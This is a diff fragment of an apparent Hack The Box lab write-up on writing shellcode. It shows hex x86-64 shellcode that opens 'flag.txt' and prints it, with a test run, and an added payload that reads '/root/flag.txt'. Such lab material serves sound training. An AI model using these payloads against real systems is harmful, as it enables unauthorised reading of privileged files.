@@ -26,11 +26,12 @@ Now use shellcodePwn.py to generatecode to read the file "flag.txt":
 Next, we'll test it:
 
     ./shellcodeRun.py -s 6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
-    Output:
+    Shellcode Output:
     HTB{f4lS3_fLag}
 
 Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":
 
-
+    ./shellcodePwn.py 
+    48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
 
 
